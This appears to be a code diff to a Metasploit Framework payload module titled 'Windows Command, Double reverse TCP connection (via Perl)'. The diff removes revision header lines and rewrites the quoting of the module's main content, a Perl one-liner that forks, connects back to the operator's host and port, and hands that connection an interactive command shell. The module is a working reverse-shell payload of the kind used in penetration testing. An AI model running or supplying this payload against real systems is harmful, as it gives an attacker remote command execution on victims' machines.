@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -22,7 +18,6 @@ module Metasploit3
 	def initialize(info = {})
 		super(merge_info(info,
 			'Name'          => 'Windows Command, Double reverse TCP connection (via Perl)',
-			'Version'       => '$Revision$',
 			'Description'   => 'Creates an interactive shell via perl',
 			'Author'        => ['cazz', 'patrick'],
 			'License'       => BSD_LICENSE,
@@ -53,7 +48,7 @@ module Metasploit3
 		lhost = datastore['LHOST']
 		ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
 		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-		cmd   = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET#{ver}(PeerAddr,\"#{lhost}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+		cmd   = %{perl -MIO -e "$p=fork;exit,if($p);$c=new IO::Socket::INET#{ver}(PeerAddr,\\"#{lhost}:#{datastore['LPORT']}\\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"}
 	end
 
 end
